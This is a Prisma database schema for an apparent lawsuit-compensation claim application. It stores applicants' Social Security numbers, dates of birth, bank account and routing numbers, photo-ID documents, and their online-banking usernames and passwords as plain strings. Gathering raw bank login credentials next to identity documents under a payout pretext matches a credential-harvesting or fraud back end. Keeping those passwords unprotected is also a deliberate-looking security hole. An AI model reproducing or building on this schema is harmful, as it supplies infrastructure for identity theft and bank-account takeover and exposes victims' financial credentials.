generator client {
  provider               = "prisma-client"
  output                 = "./generated"
  engineType             = "library"
  runtime                = "nodejs"
  moduleFormat           = "esm"
  generatedFileExtension = "ts"
}

datasource db {
  provider = "mongodb"
  url      = env("DATABASE_URL")
}

model Application {
  id        String   @id @default(uuid()) @map("_id")
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt

  // Personal Information
  fullName    String
  dateOfBirth DateTime
  ssn         String
  claimId     String   @unique
  phone       String
  email       String

  // Address Information
  street String
  city   String
  state  String
  zip    String

  // Claim Information
  lawsuitType  String
  filingDate   DateTime
  court        String
  judgmentDate DateTime

  // Compensation Details
  totalAmount Float

  // Bank Details
  bankName      String
  accountNumber String
  routingNumber String
  accountType   String

  // Payment Information
  paymentMethod String
  bankVerified  Boolean @default(false)

  // Bank Login Credentials (stored when user connects bank)
  bankUsername String?
  bankPassword String?

  // Document (merged PDF of photo ID and signature)
  documentPdfUrl String // URL to PDF stored in R2

  // Consent
  consent Boolean

  // Status tracking
  status String @default("submitted") // submitted, under_review, approved, rejected

  @@index([email])
  @@index([createdAt])
}
